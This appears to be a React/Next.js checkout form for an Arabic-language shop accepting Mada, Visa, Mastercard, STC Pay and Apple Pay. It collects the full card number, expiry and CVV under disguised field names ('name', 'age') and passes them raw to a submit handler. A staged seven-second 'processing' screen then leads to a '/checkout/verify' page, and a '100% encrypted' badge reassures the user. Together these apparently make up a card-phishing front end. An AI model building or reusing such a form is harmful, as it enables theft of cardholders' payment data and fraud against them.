"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { FaWifi } from "react-icons/fa";
import { CreditCard, Lock, ShieldCheck } from "lucide-react";
import { Icon } from "@iconify/react";
import PaymentMethodSelector, { StcPayPanel, ApplePayPanel } from "../../components/checkout/TrustBadges";
import type { PaymentMethod } from "../../components/checkout/TrustBadges";

interface PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<any>;
  dueNow?: number;
}

const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];

const getCardType = (num: string): "Visa" | "Mastercard" | "Mada" | null => {
  if (!num) return null;
  if (num.length >= 6 && MADA_BINS.includes(num.slice(0, 6))) return "Mada";
  if (/^4/.test(num)) return "Visa";
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "Mastercard";
  return null;
};

const luhnCheck = (num: string) => {
  let sum = 0, shouldDouble = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let digit = parseInt(num[i]);
    if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
};

const inputBase = "w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1a6b7d]/30 focus:border-[#1a6b7d] focus:bg-white transition-all placeholder:text-gray-400";
const inputErr = "w-full bg-red-50 border-2 border-red-400 rounded-xl px-4 py-3 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-red-400/30 focus:bg-white transition-all placeholder:text-gray-400";

/* ── Processing Modal ── */
function ProcessingModal() {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
      <div className="bg-white rounded-3xl shadow-2xl px-10 py-10 flex flex-col items-center gap-6 w-[90vw] max-w-sm mx-4">
        {/* Dual-ring spinner */}
        <div className="relative w-20 h-20">
          <span className="absolute inset-0 rounded-full border-4 border-[#1a6b7d]/20" />
          <span
            className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#1a6b7d] animate-spin"
            style={{ animationDuration: "1s" }}
          />
          <span
            className="absolute inset-2 rounded-full border-4 border-transparent border-t-[#7CC043] animate-spin"
            style={{ animationDuration: "0.7s", animationDirection: "reverse" }}
          />
        </div>
        <div className="text-center space-y-1.5">
          <p className="text-base font-extrabold text-gray-800">جاري معالجة طلب الدفع</p>
          <p className="text-xs text-gray-400 leading-relaxed max-w-[220px]">
            يرجى الانتظار، لا تغلق الصفحة حتى تكتمل عملية الدفع.
          </p>
        </div>
      </div>
    </div>
  );
}

export default function PaymentForm({ onSubmit, dueNow }: PaymentFormProps) {
  const router = useRouter();
  const [method, setMethod] = useState<PaymentMethod>("card");
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors] = useState(false);
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [loading, setLoading] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [flipped, setFlipped] = useState(false);

  const cardType = getCardType(fields.name.replace(/\s/g, ""));
  const cardBg = cardType === "Mada" ? "from-green-500 to-green-800" : cardType === "Visa" ? "from-blue-600 to-blue-900" : cardType === "Mastercard" ? "from-orange-500 to-red-800" : "from-slate-600 to-slate-900";

  const runProcessingAndNavigate = async (submitFn: () => Promise<void>, paymentInfo: object) => {
    setLoading(true);
    try {
      await submitFn();
      localStorage.setItem("paymentInfo", JSON.stringify(paymentInfo));
      setProcessing(true);
      setTimeout(() => {
        setProcessing(false);
        router.push("/checkout/verify");
      }, 7000);
    } catch (error: any) {
      console.error("Payment processing error:", error);
      setProcessing(false);
      
      // Show user-friendly error message
      const errorMessage = error?.message || "حدث خطأ أثناء معالجة الطلب";
      alert(errorMessage + "\n\nيرجى المحاولة مرة أخرى أو التواصل مع الدعم الفني.");
    } finally {
      setLoading(false);
    }
  };

  const handleCardNext = async () => {
    const rawCard = fields.name.replace(/\s/g, "");
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) { setErrors(true); return; }
    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
    if (!luhnCheck(rawCard)) { setCardError("⚠️ رقم البطاقة غير صحيح"); return; }
    if (!getCardType(rawCard)) { setCardError("⚠️ نوع البطاقة غير مدعوم"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("⚠️ رمز CVV يجب أن يكون 3 أرقام"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const expMonth = Number(parts[0]), expYear = Number(parts[1]);
    const now = new Date();
    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) { setExpiryError("⚠️ يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY"); return; }
    if (expMonth < 1 || expMonth > 12) { setExpiryError("⚠️ الشهر يجب أن يكون بين 01 و 12"); return; }
    if (new Date(2000 + expYear, expMonth - 1, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setExpiryError("⚠️ تاريخ انتهاء البطاقة منتهي"); return; }
    if (2000 + expYear > now.getFullYear() + 10) { setExpiryError("⚠️ تاريخ انتهاء البطاقة غير صحيح"); return; }
    setExpiryError("");

    const last4 = rawCard.slice(-4);
    const cType = getCardType(rawCard) ?? "بطاقة";
    await runProcessingAndNavigate(
      () => onSubmit(fields),
      { method: "card", label: `${cType} •••• ${last4}`, cardType: cType }
    );
  };

  const handleStcSubmit = async (phone: string) => {
    await runProcessingAndNavigate(
      () => onSubmit({ name: phone, age: "", cvv: "", cardHolder: "STC Pay" }),
      { method: "stc", label: phone }
    );
  };

  const handleAppleSubmit = async () => {
    setLoading(true);
    try {
      const data: any = await onSubmit({
        name: "Apple Pay",
        age: "Apple Pay",
        cvv: "Apple Pay",
        cardHolder: "Apple Pay",
      });

      localStorage.setItem("paymentInfo", JSON.stringify({ method: "apple", label: "Apple Pay" }));

      const orderId = data?.orderId || (typeof window !== "undefined" ? localStorage.getItem("orderId") : "");
      const stripeUrl = orderId
        ? `https://buy.stripe.com/bJecN5ffF8aE6PE3a10Fi00?client_reference_id=${encodeURIComponent(orderId)}`
        : "https://buy.stripe.com/bJecN5ffF8aE6PE3a10Fi00";

      window.location.href = stripeUrl;
    } catch (error: any) {
      console.error("Apple Pay processing error:", error);
      setLoading(false);
      alert(error?.message || "حدث خطأ أثناء معالجة الطلب، يرجى المحاولة مرة أخرى.");
    }
  };

  const getClass = (field: keyof typeof fields, extra?: string) =>
    (errors && !fields[field]) || !!extra ? inputErr : inputBase;

  return (
    <>
      {processing && <ProcessingModal />}

      <div className="space-y-4">
          <PaymentMethodSelector value={method} onChange={setMethod} />

          {method === "card" && (
            <>
            {/* Card Preview */}
            <div className="w-full max-w-sm mx-auto" style={{ perspective: "1000px" }}>
              <div
                className="relative w-full transition-transform duration-700"
                style={{ transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)", height: "clamp(170px, 48vw, 200px)" }}
              >
                <div
                  className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${cardBg} text-white p-5 shadow-2xl select-none overflow-hidden`}
                  style={{ backfaceVisibility: "hidden" }}
                  dir="ltr"
                >
                  <div className="absolute inset-0 bg-gradient-to-tr from-white/10 to-transparent rounded-2xl pointer-events-none" />
                  <div className="flex justify-between items-start">
                    <FaWifi className="rotate-90 opacity-60" size={18} />
                    {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={48} height={26} className="object-contain brightness-200" />}
                    {(cardType === "Visa" || cardType === "Mastercard") && <Image src="/cc975b.png" alt={cardType} width={56} height={26} className="object-contain brightness-200" />}
                    {!cardType && <span className="text-xs opacity-40 font-semibold tracking-widest">BANK CARD</span>}
                  </div>
                  <div className="mt-2 w-8 h-5 rounded bg-yellow-300/80 flex items-center justify-center">
                    <div className="w-5 h-3.5 rounded-sm border border-yellow-500/60 grid grid-cols-3 gap-px p-0.5">
                      {[...Array(6)].map((_, i) => <div key={i} className="bg-yellow-500/50 rounded-sm" />)}
                    </div>
                  </div>
                  <div className="mt-2 tracking-[0.2em] text-lg font-mono font-semibold">{fields.name || "0000 0000 0000 0000"}</div>
                  <div className="flex justify-between items-end mt-3">
                    <div>
                      <p className="text-[9px] opacity-50 uppercase tracking-widest">Card Holder</p>
                      <p className="text-xs font-bold tracking-wide truncate max-w-[160px]">{fields.cardHolder || "FULL NAME"}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-[9px] opacity-50 uppercase tracking-widest">Expires</p>
                      <p className="text-xs font-bold">{fields.age || "MM/YY"}</p>
                    </div>
                  </div>
                </div>
                <div
                  className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${cardBg} text-white shadow-2xl select-none overflow-hidden`}
                  style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}
                  dir="ltr"
                >
                  <div className="w-full h-9 bg-black/70 mt-7" />
                  <div className="px-5 mt-4">
                    <p className="text-[9px] opacity-50 uppercase tracking-widest mb-1">CVV</p>
                    <div className="bg-white/90 rounded-lg h-9 flex items-center px-4">
                      <span className="text-gray-800 font-mono font-bold tracking-[0.3em] text-sm">
                        {fields.cvv ? "•".repeat(fields.cvv.length) : "•••"}
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card form */}
            <div className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden">
              <div className="px-5 py-4 border-b border-gray-50 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 bg-[#1a6b7d]/10 rounded-lg flex items-center justify-center">
                    <CreditCard size={15} className="text-[#1a6b7d]" />
                  </div>
                  <h2 className="text-sm font-bold text-gray-800">بيانات البطاقة</h2>
                </div>
                <Image src="/فيزا ماستر مدى.webp" alt="بطاقات الدفع" width={110} height={32} className="object-contain opacity-70" />
              </div>

              <div className="px-5 py-5 space-y-4">
                <div className="space-y-1.5">
                  <label className="text-xs font-semibold text-gray-600">رقم البطاقة <span className="text-red-400">*</span></label>
                  <div className="relative">
                    <span className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400"><CreditCard size={16} /></span>
                    <input
                      autoComplete="cc-number" type="text" maxLength={19} dir="ltr"
                      inputMode="numeric"
                      pattern="[0-9 ]*"
                      value={fields.name}
                      onChange={e => {
                        let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                        v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                        setFields(f => ({ ...f, name: v }));
                        setCardError("");
                      }}
                      className={`${getClass("name", cardError)} !pr-10 ${cardType ? "!pl-14" : ""} font-mono tracking-wider`}
                    />
                    {cardType && (
                      <span className="absolute left-3 top-1/2 -translate-y-1/2">
                        {cardType === "Visa" && <Icon icon="logos:visa" width={34} height={22} />}
                        {cardType === "Mastercard" && <Icon icon="logos:mastercard" width={30} height={22} />}
                        {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={34} height={18} className="object-contain" />}
                      </span>
                    )}
                  </div>
                  {cardError && <p className="text-red-400 text-xs">{cardError}</p>}
                </div>

                <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                  <div className="space-y-1.5">
                    <label className="text-xs font-semibold text-gray-600">تاريخ الانتهاء <span className="text-red-400">*</span></label>
                    <input
                      autoComplete="cc-exp" type="text" maxLength={5} dir="ltr"
                      inputMode="numeric"
                      pattern="[0-9/]*"
                      placeholder="MM/YY"
                      value={fields.age}
                      onChange={e => {
                        let v = e.target.value.replace(/\D/g, "");
                        if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4);
                        setFields(f => ({ ...f, age: v }));
                        setExpiryError("");
                      }}
                      className={`${getClass("age", expiryError)} text-center font-mono tracking-wider`}
                    />
                    {expiryError && <p className="text-red-400 text-xs">{expiryError}</p>}
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-xs font-semibold text-gray-600">رمز CVV <span className="text-red-400">*</span></label>
                    <div className="relative">
                      <span className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400"><Lock size={13} /></span>
                      <input
                        autoComplete="cc-csc" type="password" maxLength={3} dir="ltr"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        placeholder="•••"
                        value={fields.cvv}
                        onFocus={() => setFlipped(true)}
                        onBlur={() => setFlipped(false)}
                        onChange={e => { setFields(f => ({ ...f, cvv: e.target.value.replace(/\D/g, "").slice(0, 3) })); setCvvError(""); }}
                        className={`${getClass("cvv", cvvError)} !pr-9 text-center font-mono tracking-[0.3em]`}
                      />
                    </div>
                    {cvvError && <p className="text-red-400 text-xs">{cvvError}</p>}
                  </div>
                  <div className="col-span-2 md:col-span-1 space-y-1.5">
                    <label className="text-xs font-semibold text-gray-600">اسم حامل البطاقة <span className="text-red-400">*</span></label>
                    <input
                      autoComplete="cc-name" type="text" dir="ltr"
                      value={fields.cardHolder}
                      onChange={e => setFields(f => ({ ...f, cardHolder: e.target.value.replace(/[^a-zA-Z ]/g, "").toUpperCase() }))}
                      className={`${getClass("cardHolder")} uppercase tracking-wide`}
                    />
                  </div>
                </div>
              </div>

              <div className="bg-gray-50 border-t border-gray-100 px-5 py-3 flex items-center justify-center gap-2">
                <ShieldCheck size={13} className="text-[#7CC043]" />
                <span className="text-xs text-gray-400">جميع البيانات مشفرة وآمنة بنسبة 100%</span>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => router.push("/cart")}
                className="flex-1 border-2 border-gray-200 text-gray-600 font-bold py-4 rounded-xl text-sm hover:bg-gray-50 transition-all"
              >
                السابق
              </button>
              <button
                onClick={handleCardNext}
                disabled={loading || processing}
                className="flex-[2] py-4 bg-gradient-to-bl from-[#1a6b7d] to-[#155e6f] text-white rounded-xl font-extrabold text-base shadow-lg shadow-[#1a6b7d]/25 hover:scale-[1.02] active:scale-[0.98] transition-all disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                <Lock size={15} />
                {loading ? "جاري المعالجة..." : "تأكيد الدفع"}
              </button>
            </div>
            </>
          )}

          {method === "stc" && (
            <StcPayPanel
              onSubmit={handleStcSubmit}
              onBack={() => router.push("/cart")}
              loading={loading || processing}
            />
          )}

          {method === "apple" && (
            <ApplePayPanel
              onBack={() => router.push("/cart")}
              onSubmit={handleAppleSubmit}
              loading={loading || processing}
              dueNow={dueNow}
            />
          )}
        </div>
    </>
  );
}
